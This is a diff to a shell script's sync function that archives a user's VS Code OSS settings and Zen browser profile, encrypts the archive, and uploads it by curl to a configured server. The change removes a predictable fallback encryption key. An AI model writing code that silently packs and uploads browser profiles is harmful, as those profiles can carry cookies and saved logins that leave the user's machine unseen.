@@ -355,23 +355,25 @@ do_sync() {
     else
         if [ -d "$HOME/.config/Code - OSS/User" ] || [ -d "$HOME/.config/zen" ]; then
             SESSION_KEY=$(github-auth-broker session-key "$TARGET_SEAL" 2>/dev/null || true)
-            PASS_KEY="${SESSION_KEY:-master_${TARGET_SEAL}}"
-            tar -czf - \
-                --exclude="cache2" \
-                --exclude="startupCache" \
-                --exclude="lock" \
-                --exclude=".parentlock" \
-                --exclude="Crash Reports" \
-                --exclude="minidumps" \
-                --exclude="*.tmp" \
-                --exclude="*.log" \
-                --exclude="*.sock" \
-                -C "$HOME/.config" "Code - OSS/User" "zen" 2>/dev/null | \
-                PASS_KEY="$PASS_KEY" openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -pass env:PASS_KEY -out "$VAULT_DIR/vault.enc" 2>/dev/null || true
-            unset SESSION_KEY
+            if [ -n "$SESSION_KEY" ]; then
+                PASS_KEY="$SESSION_KEY"
+                tar -czf - \
+                    --exclude="cache2" \
+                    --exclude="startupCache" \
+                    --exclude="lock" \
+                    --exclude=".parentlock" \
+                    --exclude="Crash Reports" \
+                    --exclude="minidumps" \
+                    --exclude="*.tmp" \
+                    --exclude="*.log" \
+                    --exclude="*.sock" \
+                    -C "$HOME/.config" "Code - OSS/User" "zen" 2>/dev/null | \
+                    PASS_KEY="$PASS_KEY" openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -pass env:PASS_KEY -out "$VAULT_DIR/vault.enc" 2>/dev/null || true
+                unset SESSION_KEY
 
-            if [ -f "$VAULT_DIR/vault.enc" ] && [ -n "$GW_SYNC_URL" ]; then
-                curl -s -X POST --data-binary @"$VAULT_DIR/vault.enc" "$GW_SYNC_URL/api/v1/vault/upload?seal=$TARGET_SEAL" >/dev/null 2>&1 || true
+                if [ -f "$VAULT_DIR/vault.enc" ] && [ -n "$GW_SYNC_URL" ]; then
+                    curl -s -X POST --data-binary @"$VAULT_DIR/vault.enc" "$GW_SYNC_URL/api/v1/vault/upload?seal=$TARGET_SEAL" >/dev/null 2>&1 || true
+                fi
             fi
         fi
     fi
